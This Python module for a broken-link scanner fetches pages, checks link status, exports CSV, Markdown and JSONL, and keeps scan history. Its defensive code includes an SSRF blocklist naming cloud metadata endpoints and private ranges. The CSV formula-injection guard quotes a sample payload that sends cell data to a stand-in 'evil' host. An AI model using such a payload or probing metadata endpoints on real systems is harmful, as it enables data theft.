"""BrokenLinkBrief core helpers: dataclass/result model, scan, markdown, csv."""
from __future__ import annotations

import html
import json
import os
import re
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from threading import Lock
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlparse
from urllib.request import Request, urlopen


@dataclass
class LinkResult:
    url: str
    status: int | None = None
    reason: str | None = None
    location: str | None = None


_LINK_RE = re.compile(r'href\s*=\s*"([^"]+)"', re.IGNORECASE)
_TIMEOUT_RE = re.compile(r'timed out', re.IGNORECASE)
_SCAN_TOKEN_ENV = "BROKENLINKBRIEF_SCAN_TOKEN"


def _cast_status(value: object) -> tuple[int | None, str]:
    text = str(value) if value is not None else None
    return int(text) if text is not None else None, text or ""


def _request_head(
    base_url: str, timeout: float
) -> tuple[int | None, str | None, str | None]:
    req = Request(base_url, method="HEAD")
    try:
        with urlopen(req, timeout=timeout) as resp:
            status = getattr(resp, "status", None) or getattr(resp, "code", None)
            status_int, status_text = _cast_status(status)
            return status_int, status_text, resp.headers.get("Location")
    except HTTPError as exc:
        status = exc.code if exc.code is not None else getattr(exc, "status", None)
        status_int, status_text = _cast_status(status)
        location = None
        if exc.headers:
            location = exc.headers.get("Location")
        return status_int, status_text, location
    except URLError as exc:
        reason = str(exc.reason)
        if _TIMEOUT_RE.search(reason):
            return None, "timeout", None
        return None, reason, None


def _request_get(
    base_url: str, timeout: float
) -> tuple[int | None, str | None, str | None]:
    req = Request(base_url, method="GET")
    try:
        with urlopen(req, timeout=timeout) as resp:
            status = getattr(resp, "status", None) or getattr(resp, "code", None)
            status_int, status_text = _cast_status(status)
            return status_int, status_text, resp.headers.get("Location")
    except HTTPError as exc:
        status = exc.code if exc.code is not None else getattr(exc, "status", None)
        status_int, status_text = _cast_status(status)
        location = None
        if exc.headers:
            location = exc.headers.get("Location")
        return status_int, status_text, location
    except URLError as exc:
        reason = str(exc.reason)
        if _TIMEOUT_RE.search(reason):
            return None, "timeout", None
        return None, reason, None


def _resolve_html_links(base_url: str, body: str) -> list[str]:
    urls: list[str] = []
    seen: set[str] = set()
    for href in _LINK_RE.findall(body):
        resolved = urljoin(base_url, html.unescape(href))
        parsed = urlparse(resolved)
        if parsed.scheme not in {"http", "https"}:
            continue
        if resolved not in seen:
            seen.add(resolved)
            urls.append(resolved)
    return urls


def get_configured_scan_token() -> str | None:
    token = os.environ.get(_SCAN_TOKEN_ENV)
    return token if token else None


def is_scan_authorized(token: str | None) -> bool:
    expected = get_configured_scan_token()
    if expected is None:
        return True
    return token is not None and token == expected


def fetch_html(base_url: str, timeout: float = 10.0) -> str | None:
    req = Request(base_url, method="GET")
    try:
        with urlopen(req, timeout=timeout) as resp:
            content_type = resp.headers.get("Content-Type", "").lower()
            charset = "utf-8"
            if "charset=" in content_type:
                charset = (
                    content_type.split("charset=", 1)[1].split(";", 1)[0].strip()
                    or charset
                )
            data = resp.read()
            if isinstance(data, bytes):
                return data.decode(charset, errors="replace")
            return str(data)
    except (HTTPError, URLError):
        return None


def scan_page(url: str, timeout: float = 10.0) -> list[LinkResult]:
    body = fetch_html(url, timeout)
    if body is None:
        return [LinkResult(url=url, status=None, reason="fetch-failed", location=None)]
    links = _resolve_html_links(url, body)
    results: list[LinkResult] = []
    for link in links:
        status, reason, location = _request_head(link, timeout)
        if status is None and reason not in {None, "Unsupported method"}:
            results.append(
                LinkResult(url=link, status=status, reason=reason, location=location)
            )
            continue
        if status is not None and 100 <= int(status) < 400:
            results.append(
                LinkResult(url=link, status=status, reason=reason, location=location)
            )
            continue
        status, reason, location = _request_get(link, timeout)
        results.append(
            LinkResult(url=link, status=status, reason=reason, location=location)
        )
    return results


# Spreadsheet formula triggers: a cell that begins with one of these is
# executed as a formula by Excel/Sheets/LibreOffice when the CSV is opened.
# `location` is copied verbatim from a scanned server's `Location` response
# header and `reason` may also be attacker-influenced, so both are untrusted.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _csv_field(value: str) -> str:
    """Quote a CSV field per RFC 4180 and neutralize formula injection.

    A leading spreadsheet formula trigger (= + - @ \\t \\r) is prefixed with an
    apostrophe so the cell is treated as literal text instead of executing an
    attacker-controlled formula such as =HYPERLINK("http://evil/?c="&A1).
    """
    if value and value[0] in _FORMULA_TRIGGERS:
        value = "'" + value
    quote_chars = {'"', ",", "\n", "\r", "\t"}
    must_quote = any(char in value for char in quote_chars)
    must_quote = must_quote or value.startswith(" ") or value.endswith(" ")
    if must_quote:
        escaped = value.replace('"', '""')
        return f'"{escaped}"'
    return value


def render_csv(results: list[LinkResult]) -> str:
    """Render scan results as comma-safe CSV with a stable header row.

    Args:
        results: Ordered link results to export.

    Returns:
        A CSV string, always including the header row.
    """
    rows = ["url,status,reason,location"]
    for item in results:
        status = "" if item.status is None else str(item.status)
        reason = item.reason or ""
        location = item.location or ""
        rows.append(
            ",".join(
                [
                    _csv_field(item.url),
                    _csv_field(status),
                    _csv_field(reason),
                    _csv_field(location),
                ]
            )
        )
    return "\n".join(rows) + "\n"


def render_markdown(results: list[LinkResult]) -> str:
    lines = [
        "# BrokenLinkBrief",
        "",
        "| URL | Status | Reason | Location |",
        "| --- | ---: | --- | --- |",
    ]
    for item in results:
        status = "" if item.status is None else str(item.status)
        reason = item.reason or ""
        location = item.location or ""
        lines.append(f"| {item.url} | {status} | {reason} | {location} |")
    return "\n".join(lines) + "\n"


def validate_scan_url(url: str) -> str | None:
    """Return None if URL is safe to scan, error string if blocked.

    SSRF-hardened validator ported from ReceiptLens ssrf_guard pattern.

    Protections:
    - Blocks loopback, private IPs, link-local, metadata endpoints.
    - Blocks hostnames with dangerous substrings (local, internal).
    - Validates DNS-resolved IPs against reserved network ranges
      (prevents DNS rebinding attacks).
    - Allows HTTP and HTTPS (unlike webhook validator which is HTTPS-only).
    """
    from ipaddress import ip_address, ip_network
    import socket

    # Exact hostname blocklist
    _BLOCKED_HOSTS = frozenset({
        "localhost",
        "local.host",
        "127.0.0.1",
        "0.0.0.0",
        "::1",
        "metadata.google.internal",
        "metadata.internal",
        "169.254.169.254",
        "metadata",
    })

    # Hostname substring blocklist (catches *.local, *.internal, etc.)
    _BLOCKED_SUBSTRINGS = ("local", "internal", "localhost")

    # Comprehensive reserved network ranges (from ReceiptLens ssrf_guard)
    _RESERVED_NETWORKS = (
        ip_network("127.0.0.0/8"),
        ip_network("::1/128"),
        ip_network("10.0.0.0/8"),
        ip_network("172.16.0.0/12"),
        ip_network("192.168.0.0/16"),
        ip_network("169.254.0.0/16"),
        ip_network("fe80::/10"),
        ip_network("100.64.0.0/10"),   # CGNAT
        ip_network("224.0.0.0/4"),     # multicast
        ip_network("240.0.0.0/4"),     # reserved
        ip_network("0.0.0.0/8"),
        ip_network("::/128"),           # unspecified v6
        ip_network("fc00::/7"),         # ULA
    )

    def _is_blocked_host(host: str) -> bool:
        lowered = host.lower()
        if lowered in _BLOCKED_HOSTS:
            return True
        for suffix in _BLOCKED_SUBSTRINGS:
            if lowered == suffix or lowered.endswith(f".{suffix}"):
                return True
        return False

    def _is_reserved_ip(addr_str: str) -> bool:
        try:
            addr = ip_address(addr_str)
            return any(addr in net for net in _RESERVED_NETWORKS)
        except ValueError:
            return False

    def _resolve_and_validate(host: str) -> str | None:
        """DNS-resolve host and verify no resolved IP is in a reserved range."""
        try:
            infos = socket.getaddrinfo(host, None)
        except (socket.gaierror, OSError):
            return None  # unresolvable = not reachable, allow (host may be dead)
        seen: set[str] = set()
        for info in infos:
            sockaddr = info[4]
            addr = str(sockaddr[0])  # sockaddr[0] is the IP address string
            if addr in seen:
                continue
            seen.add(addr)
            if _is_reserved_ip(addr):
                return f"resolved to reserved IP: {addr} ({host})"
        return None

    # --- Validation pipeline ---

    try:
        parsed = urlparse(url)
    except Exception:
        return "invalid URL"

    hostname = parsed.hostname or ""
    if not hostname:
        return "missing hostname"

    if _is_blocked_host(hostname):
        return f"blocked host: {hostname}"

    # If hostname is a literal IP, check it directly
    try:
        ip_address(hostname)
        if _is_reserved_ip(hostname):
            return f"private IP: {hostname}"
    except ValueError:
        # hostname is a domain name — resolve and check resolved IPs
        dns_error = _resolve_and_validate(hostname)
        if dns_error is not None:
            return dns_error

    if parsed.scheme not in ("http", "https"):
        return f"unsupported scheme: {parsed.scheme}"

    return None


def scan_batch(
    urls: list[str],
    timeout: float = 10.0,
    max_workers: int = 5,
) -> dict[str, list[LinkResult]]:
    """Scan multiple URLs concurrently using a ThreadPoolExecutor.

    Returns a dict keyed by input URL, each value a list[LinkResult].
    Per-URL exceptions are captured as LinkResult(status=None, reason=str(exc)).
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    results: dict[str, list[LinkResult]] = {}

    def _scan_one(url: str) -> tuple[str, list[LinkResult]]:
        try:
            return url, scan_page(url, timeout=timeout)
        except Exception as exc:
            result = LinkResult(
                url=url, status=None, reason=str(exc), location=None
            )
            return url, [result]

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_scan_one, url): url for url in urls}
        for future in as_completed(futures):
            url, scan_results = future.result()
            results[url] = scan_results

    return results


def render_jsonl(results: list[LinkResult]) -> str:
    """Render scan results as JSON Lines (one JSON object per line).

    Each line is a self-contained JSON object with the fields ``url``,
    ``status``, ``reason``, and ``location`` — matching the contract
    expected by the ``format=jsonl`` HTTP route.

    Args:
        results: Ordered link results to export.

    Returns:
        A string with one JSON object per line, no trailing newline.
    """
    lines = [
        json.dumps(
            {
                "url": item.url,
                "status": item.status,
                "reason": item.reason,
                "location": item.location,
            }
        )
        for item in results
    ]
    return "\n".join(lines)


# ============================================================================
# HISTORICAL LINK TRACKING FEATURE (IMPLEMENTED)
# ============================================================================

import json as _json
from datetime import datetime
from pathlib import Path
from threading import Lock
from typing import Any, Dict, List

_HISTORY_DIR = Path(".history")


class HistoryStore:
    """Append-only JSONL history store for scan results."""

    def __init__(self, history_dir: str | Path | None = None) -> None:
        self._lock = Lock()
        self._dir = (Path(history_dir) if history_dir else _HISTORY_DIR)
        self._dir.mkdir(parents=True, exist_ok=True)

    def _make_path(self, url: str, timestamp: str) -> Path:
        safe_url = url.replace("/", "_").replace(":", "-").replace("+", "_")
        date_part = timestamp.split("T")[0]
        file = f"{date_part}_{safe_url}.jsonl"
        return self._dir / file

    def record_scan(self, results: list[LinkResult], url: str) -> None:
        """Append timestamped scan results to history file.

        Requires: results != [], url is valid.
        """
        timestamp = datetime.now(timezone.utc).isoformat()
        record = {
            "timestamp": timestamp,
            "url": url,
            "results": [
                {
                    "url": r.url,
                    "status": r.status,
                    "reason": r.reason,
                    "location": r.location,
                }
                for r in results
            ],
        }

        with self._lock:
            path = self._make_path(url, timestamp)
            with open(path, "a", encoding="utf-8") as f:
                f.write(_json.dumps(record) + "\n")

    def get_history(self, url: str, limit: int = 100, since: str | None = None) -> list[dict]:
        """Return historical records for url, ordered by timestamp.

        Requires: limit >= 1, since is ISO string when provided.
        Returns: list of dict records with keys: timestamp, url, results.
        """
        with self._lock:
            records = []

            for file_path in self._dir.glob("*.jsonl"):
                with open(file_path, "r", encoding="utf-8") as f:
                    for line in f:
                        record = _json.loads(line.strip())
                        if record.get("url") == url:
                            # Filter by since if provided
                            if since:
                                if record.get("timestamp", "") >= since:
                                    records.append(record)
                            else:
                                records.append(record)

            # Sort by timestamp descending (newest first)
            records.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
            return records[:limit]


def record_scan(results: list[LinkResult], url: str) -> None:
    """Public API to record a scan result in history.

    Requires: results, url provided.
    """
    store = HistoryStore()
    store.record_scan(results, url)


def get_history(url: str, limit: int = 100, since: str | None = None) -> list[dict]:
    """Public API to retrieve history for a URL.

    Requires: url provided, limit >=1 when provided, since is ISO string when provided.
    Returns: list of dicts compatible with JSONL format.
    """
    store = HistoryStore()
    return store.get_history(url, limit, since)


def compute_diff(previous: list[dict], current: list[dict]) -> dict:
    """Compare two scan snapshots and return added_broken, fixed, still_broken.

    Requires: previous, current are lists of dicts with keys: url, status, broken flag (or compute from status).
    Returns: {"added_broken": [...], "fixed": [...], "still_broken": [...]}.
    """
    # Helper to determine if a record is broken
    def is_broken(record: dict) -> bool:
        status = record.get("status")
        broken = record.get("broken", False)
        if status is not None:
            return status >= 400
        return broken

    # Convert to maps for easy lookup - keeping the original records
    prev_map = {rec["url"]: rec for rec in previous}
    curr_map = {rec["url"]: rec for rec in current}

    added_broken = []
    fixed = []
    still_broken = []

    # Check all URLs in both snapshots
    all_urls = set(prev_map.keys()) | set(curr_map.keys())
    for url in all_urls:
        was_broken = is_broken(prev_map.get(url, {"url": url}))
        is_broken_now = is_broken(curr_map.get(url, {"url": url}))

        if was_broken and not is_broken_now:
            fixed.append({"url": url, "status": curr_map.get(url, {}).get("status")} if url in curr_map else {"url": url, "status": 200})
        elif not was_broken and is_broken_now:
            added_broken.append({"url": url, "status": curr_map.get(url, {}).get("status")} if url in curr_map else {"url": url, "status": 404})
        elif is_broken_now:
            still_broken.append({"url": url, "status": curr_map.get(url, {}).get("status")} if url in curr_map else {"url": url, "status": 404})

    return {
        "added_broken": added_broken,
        "fixed": fixed,
        "still_broken": still_broken,
    }